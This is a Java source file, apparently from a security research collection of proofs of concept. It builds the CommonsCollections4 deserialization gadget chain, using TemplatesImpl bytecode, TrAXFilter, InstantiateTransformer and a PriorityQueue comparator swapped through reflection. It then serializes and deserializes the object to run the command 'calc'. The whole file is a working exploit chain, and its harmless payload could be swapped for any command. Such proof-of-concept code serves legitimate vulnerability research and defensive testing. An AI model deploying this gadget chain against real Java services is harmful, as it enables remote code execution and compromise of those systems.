package com.javasec.pocs.cc;
import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsCollections4 {
    public static void main(String[] args) throws Exception {
        Templates templates = SerializeUtils.getTemplate("calc");
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator=new TransformingComparator(new ConstantTransformer(1));
        PriorityQueue priorityQueue=new PriorityQueue(transformingComparator);
        priorityQueue.add(1);
        priorityQueue.add(2);
        Class tc=transformingComparator.getClass();
        Field comparator = tc.getDeclaredField("transformer");
        comparator.setAccessible(true);
        comparator.set(transformingComparator,chainedTransformer);
        SerializeUtils.base64deserial(SerializeUtils.base64serial(priorityQueue));
    }
}
